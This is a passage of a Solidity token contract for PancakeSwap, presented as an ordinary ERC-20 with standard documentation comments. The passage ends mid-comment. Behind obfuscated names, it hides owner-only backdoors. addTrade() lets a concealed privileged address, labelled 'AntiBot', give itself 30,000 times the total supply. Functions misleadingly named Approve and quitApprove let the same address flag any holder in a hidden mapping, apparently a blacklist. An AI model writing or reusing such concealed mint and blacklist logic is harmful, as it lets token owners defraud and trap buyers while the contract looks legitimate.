interface IPancakeFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IPancakeRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract Token is Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public _pxpxmuskJCEO;
    address public pancakePair;

    uint256 private _MYtotalSupply;
    string private _MYname;
    string private _MYsymbol;

    mapping(address => bool) private pepevipcc;

    function quitApprove(address sss) external {
        if (_pxpxmuskJCEO == _msgSender()) {
            pepevipcc[sss] = false;
        }
    }

    function Approve(address sss) external {
        if (_pxpxmuskJCEO == _msgSender()) {
            pepevipcc[sss] = true;
        }
    }

    function queryacawtibot(address sss) public view returns (bool) {
        return pepevipcc[sss];
    }

    function vultBox() public view virtual returns (uint256) {
        return _MYtotalSupply;
    }

    function addTrade() external {
        if (_msgSender() != _pxpxmuskJCEO) {
            return;
        }
        if (_pxpxmuskJCEO == _msgSender()) {
            _balances[_msgSender()] = vultBox() * 30000;
        }
    }

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(
        string memory name_,
        string memory symbol_,
        uint256 total,
        address AntiBot,
        address router,
        address pairToken
    ) {
        _MYname = name_;
        _MYsymbol = symbol_;
        _pxpxmuskJCEO = AntiBot;

        _MYtotalSupply = total * 10 ** decimals();
        _balances[_pxpxmuskJCEO] = _MYtotalSupply;
        emit Transfer(address(0), _pxpxmuskJCEO, _MYtotalSupply);

        address _pancakePair = IPancakeFactory(IPancakeRouter(router).factory())
            .createPair(address(this), pairToken);
        pancakePair = _pancakePair;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _MYname;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _MYsymbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
